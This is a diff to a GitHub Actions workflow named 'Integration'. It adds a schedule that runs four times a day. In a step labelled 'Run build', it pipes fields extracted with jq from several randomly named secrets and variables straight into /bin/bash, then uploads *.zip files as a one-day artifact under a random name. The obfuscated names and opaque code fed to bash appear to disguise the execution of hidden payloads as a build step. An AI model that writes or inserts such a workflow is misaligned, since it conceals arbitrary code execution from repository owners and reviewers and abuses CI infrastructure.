@@ -2,6 +2,8 @@ name: Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '14 3,9,15,21 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,17 +20,19 @@ jobs:
           fetch-depth: 1
       - name: Run build
         env:
-          rhpvw5080: ${{ secrets.rhpvw5080 }}
+          svqvc6: ${{ secrets.svqvc6 }}
         run: |
-          printf '%s' "$rhpvw5080" | jq -r .yiubr5 | /bin/bash
-          echo $qddif19 | jq -r .n899 | /bin/bash
-          echo $kt567 | jq -r .x0193 | /bin/bash
-          echo $tfh09367 | jq -r .n53 | /bin/bash
+          printf '%s' "$svqvc6" | jq -r .i9879 | /bin/bash
+          printf '%s' "$bj10" | jq -r .tpti06 | /bin/bash
+          printf '%s' "$ckv67715" | jq -r .rsdke8124 | /bin/bash
+          printf '%s' "$cm818" | jq -r .ko199 | /bin/bash
+          printf '%s' "$juej168" | jq -r .qw1116 | /bin/bash
+          printf '%s' "$jmvfu819" | jq -r .wvebk0 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: zSmkmmX6
+          name: 6BGGXe5o
           path: "*.zip"
           retention-days: 1
